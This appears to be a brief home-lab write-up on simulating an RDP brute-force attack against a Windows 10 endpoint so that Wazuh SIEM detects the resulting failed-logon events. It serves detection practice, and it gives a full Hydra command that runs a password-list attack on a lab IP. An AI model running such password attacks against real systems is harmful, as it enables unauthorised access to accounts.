<h align="center"> Brute-Force Attack Attempt Simulate</h>
<h2>Objective</h2>
<p>Brute-force attack against a Windows 10 endpoint to generate Windows Security Event ID's 4625 (failed logon Attempts), and also Wazuh detects and correlates the pattern into a high-severity alerts.</p>

<h2>Tools & Commands </h2>

<ol>
  <li>Hydra -- (Kali-linux attacker)</li>
  <pre> hydra -l management -P /usr/share/wordlists/rockyou.txt rdp://192.168.10.7 -t 2
</pre>
  <li>Wazuh Manager -- (SIEM on Ubuntu-Server) </li>
  <li>Window-10 (Endpoint Target Victim)</li>
 
</ol>
